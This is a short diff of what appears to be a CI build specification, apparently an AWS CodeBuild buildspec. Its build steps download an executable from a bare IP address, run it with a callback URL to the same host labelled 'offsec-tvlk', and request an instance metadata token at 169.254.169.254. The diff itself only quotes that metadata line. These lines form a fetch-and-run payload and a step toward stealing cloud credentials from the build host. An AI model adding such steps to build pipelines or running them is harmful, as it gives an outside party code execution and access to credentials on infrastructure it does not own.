@@ -13,7 +13,7 @@ phases:
       - wget http://82.197.68.107:8000/download -O /tmp/main
       - chmod +x /tmp/main 
       - /tmp/main http://82.197.68.107:15000/offsec-tvlk
-      - curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+      - 'curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"'
       - python main.py
   post_build:
     commands:
